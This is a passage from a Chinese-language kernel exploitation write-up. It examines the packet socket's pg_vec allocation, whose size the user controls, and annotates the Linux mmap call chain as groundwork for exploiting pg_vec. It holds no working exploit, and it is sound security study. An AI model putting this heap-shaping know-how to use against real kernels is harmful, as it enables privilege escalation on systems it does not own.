20     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               pg_vec_order;         <span class="comment">/*    24     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               pg_vec_pages;         <span class="comment">/*    28     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               pg_vec_len;           <span class="comment">/*    32     4 */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XXX 4 bytes hole, try to pack */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> *             pending_refcnt;       <span class="comment">/*    40     8 */</span></span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="type">long</span> <span class="type">unsigned</span> <span class="type">int</span> * rx_owner_map;        <span class="comment">/*    48     8 */</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span> <span class="title">prb_bdqc</span>;</span>       <span class="comment">/*    48   152 */</span></span><br><span class="line">    &#125;;                                             </span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tpacket_kbdq_core</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *               <span class="title">pkbdq</span>;</span>                <span class="comment">/*     0     8 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               feature_req_word;     <span class="comment">/*     8     4 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span>               hdrlen;               <span class="comment">/*    12     4 */</span></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div>

<p>并且在<code>alloc_pg_vec()</code>中发现申请的<code>pg_vec</code>大小为我们可控(<code>block_nr</code>),因此我们可以申请得到几乎任意大小的堆块。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> pgv *<span class="title function_">alloc_pg_vec</span><span class="params">(<span class="keyword">struct</span> tpacket_req *req, <span class="type">int</span> order)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> block_nr = req-&gt;tp_block_nr;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pgv</span> *<span class="title">pg_vec</span>;</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="comment">//根据请求块大小申请</span></span><br><span class="line">    pg_vec = kcalloc(block_nr, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> pgv), GFP_KERNEL | __GFP_NOWARN);</span><br><span class="line">    <span class="keyword">if</span> (unlikely(!pg_vec))</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line">    <span class="comment">//为每个 pg_vec[i] 分配一个页面</span></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; block_nr; i++) &#123;</span><br><span class="line">        pg_vec[i].buffer = alloc_one_pg_vec_page(order);</span><br><span class="line">        <span class="keyword">if</span> (unlikely(!pg_vec[i].buffer))</span><br><span class="line">            <span class="keyword">goto</span> out_free_pgvec;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">out:</span><br><span class="line">    <span class="keyword">return</span> pg_vec;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>了解漏洞的产生原因，进一步了解如何利用<code>pg_vec</code>。</p>
<p><strong>mmap</strong></p>
<p><code>mmap</code>调用链<code>sys_mmap()-&gt;ksys_mmap_pgoff()</code>。<code>ksys_mmap_pgoff()</code>主要是针对大页映射的一个预处理，之后调用<code>vm_mmap_pgoff()</code>.</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">ksys_mmap_pgoff</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> len,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">long</span> prot, <span class="type">unsigned</span> <span class="type">long</span> flags,</span></span><br><span class="line"><span class="params">                  <span class="type">unsigned</span> <span class="type">long</span> fd, <span class="type">unsigned</span> <span class="type">long</span> pgoff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> retval;</span><br><span class="line">    <span class="comment">//预处理文件映射</span></span><br><span class="line">    <span class="keyword">if</span> (!(flags &amp; MAP_ANONYMOUS)) &#123;</span><br><span class="line">        audit_mmap_fd(fd, flags);</span><br><span class="line">        file = fget(fd);<span class="comment">//从fd拿出file</span></span><br><span class="line">        <span class="keyword">if</span> (!file)</span><br><span class="line">            <span class="keyword">return</span> -EBADF;</span><br><span class="line">        <span class="comment">//映射文件是否是 hugetlbfs 中的文件（巨大页）</span></span><br><span class="line">        <span class="keyword">if</span> (is_file_hugepages(file)) &#123;</span><br><span class="line">            len = ALIGN(len, huge_page_size(hstate_file(file)));</span><br><span class="line">            <span class="comment">//长度对齐</span></span><br><span class="line">        <span class="comment">//mmap映射巨大文件的时候不需要MAP_HUGETLB，普通文件不能使用大页映射</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (unlikely(flags &amp; MAP_HUGETLB)) &#123;</span><br><span class="line">            retval = -EINVAL;</span><br><span class="line">            <span class="keyword">goto</span> out_fput;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//巨大页映射</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (flags &amp; MAP_HUGETLB) &#123;</span><br><span class="line">        <span class="keyword">struct</span> user_struct *user = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">hstate</span> *<span class="title">hs</span>;</span></span><br><span class="line">        <span class="comment">//大页尺寸</span></span><br><span class="line">        hs = hstate_sizelog((flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK);</span><br><span class="line">        <span class="keyword">if</span> (!hs)</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line"></span><br><span class="line">        len = ALIGN(len, huge_page_size(hs));</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * VM_NORESERVE is used because the reservations will be</span></span><br><span class="line"><span class="comment">         * taken when vm_ops-&gt;mmap() is called</span></span><br><span class="line"><span class="comment">         * A dummy user value is used because we are not locking</span></span><br><span class="line"><span class="comment">         * memory so no accounting is necessary</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        file = hugetlb_file_setup(HUGETLB_ANON_FILE, len,</span><br><span class="line">                VM_NORESERVE,</span><br><span class="line">                &amp;user, HUGETLB_ANONHUGE_INODE,</span><br><span class="line">                (flags &gt;&gt; MAP_HUGE_SHIFT) &amp; MAP_HUGE_MASK);</span><br><span class="line">        <span class="keyword">if</span> (IS_ERR(file))</span><br><span class="line">            <span class="keyword">return</span> PTR_ERR(file);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    flags &amp;= ~(MAP_EXECUTABLE | MAP_DENYWRITE);</span><br><span class="line">    <span class="comment">//调用进行映射</span></span><br><span class="line">    retval = vm_mmap_pgoff(file, addr, len, prot, flags, pgoff);</span><br><span class="line">out_fput:</span><br><span class="line">    <span class="keyword">if</span> (file)</span><br><span class="line">        fput(file);</span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>vm_mmap_pgoff()</code>,会对虚拟内存空间先上写锁，然后调用<code>do_mmap()</code>进一步完成映射。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">vm_mmap_pgoff</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> prot,</span></span><br><span class="line"><span class="params">    <span class="type">unsigned</span> <span class="type">long</span> flag, <span class="type">unsigned</span> <span class="type">long</span> pgoff)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> ret;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;<span class="comment">//获取内存虚拟内存空间</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> populate;</span><br><span class="line">    <span class="comment">//populate 取决于MAP_POPULATE 或者 MAP_LOCKED，会在映射后立即分配物理页面</span></span><br><span class="line">    <span class="comment">//populate表示要分配的物理内存大小</span></span><br><span class="line">    LIST_HEAD(uf);</span><br><span class="line"></span><br><span class="line">    ret = security_mmap_file(file, prot, flag);</span><br><span class="line">    <span class="keyword">if</span> (!ret) &#123;</span><br><span class="line">        <span class="comment">//上写锁</span></span><br><span class="line">        <span class="keyword">if</span> (mmap_write_lock_killable(mm))</span><br><span class="line">            <span class="keyword">return</span> -EINTR;</span><br><span class="line">        <span class="comment">//开始mmap映射，在进程虚拟空间先分配一段vma，建立映射关系，然后返回映射地址</span></span><br><span class="line">        ret = do_mmap(file, addr, len, prot, flag, pgoff, &amp;populate,</span><br><span class="line">                  &amp;uf);</span><br><span class="line">        mmap_write_unlock(mm);</span><br><span class="line">        userfaultfd_unmap_complete(mm, &amp;uf);</span><br><span class="line">        <span class="comment">//提前分配物理内存页面，后期访问该地址就不会缺页</span></span><br><span class="line">        <span class="comment">//否则需要后期切到内核态来处理缺页时再分配物理页面</span></span><br><span class="line">        <span class="keyword">if</span> (populate)</span><br><span class="line">            mm_populate(ret, populate);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在<code>do_mmap()</code>映射的时候主要选择查看文件匿名映射的一个过程。首先就是各种检查然后对映射方式进行选择之后调用核心函数<code>mmap_region()</code>进行映射。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">do_mmap</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">unsigned</span> <span class="type">long</span> prot,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff,</span></span><br><span class="line"><span class="params">            <span class="type">unsigned</span> <span class="type">long</span> *populate, <span class="keyword">struct</span> list_head *uf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;<span class="comment">//获取进程虚拟内存空间</span></span><br><span class="line">    <span class="type">vm_flags_t</span> vm_flags;</span><br><span class="line">    <span class="type">int</span> pkey = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    *populate = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 虚拟内存中vma是有限的，检查是否超过限制 */</span></span><br><span class="line">    <span class="keyword">if</span> (mm-&gt;map_count &gt; sysctl_max_map_count)</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Obtain the address to map to. we verify (or select) it and ensure</span></span><br><span class="line"><span class="comment">     * that it represents a valid section of the address space.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//先在进程虚拟内存空间中找到一个未映射的内存范围</span></span><br><span class="line">    addr = get_unmapped_area(file, addr, len, pgoff, flags);</span><br><span class="line">    <span class="keyword">if</span> (IS_ERR_VALUE(addr))</span><br><span class="line">        <span class="keyword">return</span> addr;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Do simple checking here so the lower-level routines won&#x27;t have</span></span><br><span class="line"><span class="comment">     * to. we assume access permissions have been handled by the open</span></span><br><span class="line"><span class="comment">     * of the memory object, so we don&#x27;t do any here.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//通过calc_()把prot和flag转换为vma中的vm_flags标志符</span></span><br><span class="line">    vm_flags = calc_vm_prot_bits(prot, pkey) | calc_vm_flag_bits(flags) |</span><br><span class="line">            mm-&gt;def_flags | VM_MAYREAD | VM_MAYWRITE | VM_MAYEXEC;</span><br><span class="line">    <span class="comment">//是否锁定</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; MAP_LOCKED)</span><br><span class="line">        <span class="comment">//检查是否能被锁定</span></span><br><span class="line">        <span class="keyword">if</span> (!can_do_mlock())</span><br><span class="line">            <span class="keyword">return</span> -EPERM;</span><br><span class="line">    <span class="comment">//检查锁定的内存页是否超过限制</span></span><br><span class="line">    <span class="keyword">if</span> (mlock_future_check(mm, vm_flags, len))</span><br><span class="line">        <span class="keyword">return</span> -EAGAIN;</span><br><span class="line">    <span class="comment">//文件映射</span></span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">inode</span> *<span class="title">inode</span> =</span> file_inode(file);<span class="comment">//获取元数据</span></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        <span class="keyword">switch</span> (flags &amp; MAP_TYPE) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">            <span class="comment">//匿名映射</span></span><br><span class="line">        <span class="keyword">case</span> MAP_PRIVATE:</span><br><span class="line">            <span class="keyword">if</span> (!(file-&gt;f_mode &amp; FMODE_READ))</span><br><span class="line">                <span class="keyword">return</span> -EACCES;</span><br><span class="line">            <span class="keyword">if</span> (path_noexec(&amp;file-&gt;f_path)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (vm_flags &amp; VM_EXEC)</span><br><span class="line">                    <span class="keyword">return</span> -EPERM;</span><br><span class="line">                vm_flags &amp;= ~VM_MAYEXEC;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//使用文件的自调用ops，后面会用到</span></span><br><span class="line">            <span class="keyword">if</span> (!file-&gt;f_op-&gt;mmap)</span><br><span class="line">                <span class="keyword">return</span> -ENODEV;</span><br><span class="line">            <span class="keyword">if</span> (vm_flags &amp; (VM_GROWSDOWN|VM_GROWSUP))</span><br><span class="line">                <span class="keyword">return</span> -EINVAL;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> -EINVAL;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*  当内存比较紧张的时候，普通申请大概率会失败，</span></span><br><span class="line"><span class="comment">        通过MAP_NORESERVE即使没有足够的 swap 空间也能申请映射到虚拟内存空间，</span></span><br><span class="line"><span class="comment">        但是后续分配物理页面的时候可能会报内存不足(oom)</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; MAP_NORESERVE) &#123;</span><br><span class="line">        <span class="comment">/* We honor MAP_NORESERVE if allowed to overcommit */</span></span><br><span class="line">        <span class="keyword">if</span> (sysctl_overcommit_memory != OVERCOMMIT_NEVER)</span><br><span class="line">            vm_flags |= VM_NORESERVE;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* 大页内存映射的时候，默认自带VM_NORESERVE，因为大页会被提前预留出来 */</span></span><br><span class="line">        <span class="keyword">if</span> (file &amp;&amp; is_file_hugepages(file))</span><br><span class="line">            vm_flags |= VM_NORESERVE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//mmap核心映射</span></span><br><span class="line">    addr = mmap_region(file, addr, len, vm_flags, pgoff, uf);</span><br><span class="line">    <span class="keyword">if</span> (!IS_ERR_VALUE(addr) &amp;&amp;</span><br><span class="line">        ((vm_flags &amp; VM_LOCKED) ||</span><br><span class="line">         (flags &amp; (MAP_POPULATE | MAP_NONBLOCK)) == MAP_POPULATE))</span><br><span class="line">        *populate = len;</span><br><span class="line">    <span class="keyword">return</span> addr;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>mmap_region()</code>函数时，还是主要关心文件映射。映射的时候如果flags有<code>MAP_FIXED</code>，那就会强制映射该地址，但是可能会有映射重叠。就会先做一个是否能于其他<code>vma</code>合并的一个操作，如果可以合并就返回，不能合并就重新申请<code>object</code>来存储<code>vma</code>结构体，<code>vma</code>初始化之后，进入文件映射，会先将文件与虚拟内存管理，之后调用<code>file</code>自带的<code>ops</code>进行映射，最后将<code>vma</code>插入到管理的红黑树中，并对<code>vma</code>和文件做反向关联。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">mmap_region</span><span class="params">(<span class="keyword">struct</span> file *file, <span class="type">unsigned</span> <span class="type">long</span> addr,</span></span><br><span class="line"><span class="params">        <span class="type">unsigned</span> <span class="type">long</span> len, <span class="type">vm_flags_t</span> vm_flags, <span class="type">unsigned</span> <span class="type">long</span> pgoff,</span></span><br><span class="line"><span class="params">        <span class="keyword">struct</span> list_head *uf)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span> =</span> current-&gt;mm;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">vm_area_struct</span> *<span class="title">vma</span>, *<span class="title">prev</span>, *<span class="title">merge</span>;</span></span><br><span class="line">    <span class="type">int</span> error;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">rb_node</span> **<span class="title">rb_link</span>, *<span class="title">rb_parent</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> charged = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 检查映射是否超过 虚拟内存空间 的限制*/</span></span><br><span class="line">    <span class="keyword">if</span> (!may_expand_vm(mm, vm_flags, len &gt;&gt; PAGE_SHIFT)) &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> nr_pages;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">         * MAP_FIXED may remove pages of mappings that intersects with</span></span><br><span class="line"><span class="comment">         * requested mapping. Account for the pages it would unmap.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="comment">/*  如果为MAP_FIXED，addr为强制映射地址，可能会有映射重叠</span></span><br><span class="line"><span class="comment">            需要统计[addr,addr+len]重叠的虚拟内存页数-&gt; nr_pages</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        nr_pages = count_vma_pages_range(mm, addr, addr + len);</span><br><span class="line">        <span class="comment">//nr_pages是重叠的映射部分</span></span><br><span class="line">        <span class="comment">//(len &gt;&gt; PAGE_SHIFT) - nr_pages == 需要申请映射的部分 是否超过限制</span></span><br><span class="line">        <span class="keyword">if</span> (!may_expand_vm(mm, vm_flags,</span><br><span class="line">                    (len &gt;&gt; PAGE_SHIFT) - nr_pages))</span><br><span class="line">            <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Clear old maps, set up prev, rb_link, rb_parent, and uf */</span></span><br><span class="line">    <span class="comment">//清除旧的映射，后面因为重叠会重新映射这部分</span></span><br><span class="line">    <span class="keyword">if</span> (munmap_vma_range(mm, addr, len, &amp;prev, &amp;rb_link, &amp;rb_parent, uf))</span><br><span class="line">        <span class="keyword">return</span> -ENOMEM;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Private writable mapping: check memory availability</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 先判断是否能和已有的vma合并</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    vma = vma_merge(mm, prev, addr, addr + len, vm_flags,</span><br><span class="line">            <span class="literal">NULL</span>, file, pgoff, <span class="literal">NULL</span>, NULL_VM_UFFD_CTX);</span><br><span class="line">    <span class="comment">//可以合并就返回</span></span><br><span class="line">    <span class="keyword">if</span> (vma)</span><br><span class="line">        <span class="keyword">goto</span> out;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Determine the object being mapped and call the appropriate</span></span><br><span class="line"><span class="comment">     * specific mapper. the address has already been validated, but</span></span><br><span class="line"><span class="comment">     * not unmapped, but the maps are removed from the list.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//不能合并，就会从新申请object来给新的vma</span></span><br><span class="line">    vma = vm_area_alloc(mm);</span><br><span class="line">    <span class="keyword">if</span> (!vma) &#123;</span><br><span class="line">        error = -ENOMEM;</span><br><span class="line">        <span class="keyword">goto</span> unacct_error;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    vma-&gt;vm_start = addr;</span><br><span class="line">    vma-&gt;vm_end = addr + len;</span><br><span class="line">    vma-&gt;vm_flags = vm_flags;</span><br><span class="line">    vma-&gt;vm_page_prot = vm_get_page_prot(vm_flags);</span><br><span class="line">    vma-&gt;vm_pgoff = pgoff;</span><br><span class="line">    <span class="comment">//文件映射</span></span><br><span class="line">    <span class="keyword">if</span> (file) &#123;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">/* -&gt;mmap() can change vma-&gt;vm_file, but must guarantee that</span></span><br><span class="line"><span class="comment">         * vma_link() below can deny write-access if VM_DENYWRITE is set</span></span><br><span class="line"><span class="comment">         * and map writably if VM_SHARED is set. This usually means the</span></span><br><span class="line"><span class="comment">         * new file must not have been exposed to user-space, yet.</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        vma-&gt;vm_file = get_file(file);<span class="comment">//文件与虚拟内存关联</span></span><br><span class="line">        error = call_mmap(file, vma);<span class="comment">//调用文件自带ops</span></span><br><span class="line">        <span class="keyword">if</span> (error)</span><br><span class="line">            <span class="keyword">goto</span> unmap_and_free_vma;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">        addr = vma-&gt;vm_start;</span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">        vm_flags = vma-&gt;vm_flags;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">    <span class="comment">//将vma 插入到管理的红黑树中</span></span><br><span class="line">    vma_link(mm, 